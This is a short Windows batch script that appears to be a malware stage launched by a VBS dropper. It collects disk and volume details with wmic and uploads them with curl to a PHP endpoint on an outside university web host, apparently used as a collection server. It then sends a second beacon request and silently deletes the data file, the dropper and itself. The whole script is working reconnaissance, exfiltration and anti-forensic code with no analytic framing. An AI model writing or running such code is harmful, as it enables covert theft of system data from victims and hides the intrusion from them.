@echo off
setlocal enabledelayedexpansion
pushd "%~dp0"
set "VBS_PATH=%~1"

wmic logicaldisk get volumename,description,caption,size,freespace > wmic.data
timeout -t 5 /nobreak
curl -X POST -H "Content-Type: multipart/form-data" -F "name=user2" -F "data=@%~dp0wmic.data" http://peace.postech.ac.kr/shop/data/brand/2021/brand.php

del /f /q wmic.data
curl -s -o nul "http://peace.postech.ac.kr/shop/data/item/2022/item.php?a=1"
start "" /b cmd /c "ping 127.0.0.1 -n 2 >nul & del /f /q """%VBS_PATH%""" "
start "" /b cmd /c "ping 127.0.0.1 -n 2 >nul & del /f /q """%~f0""" "
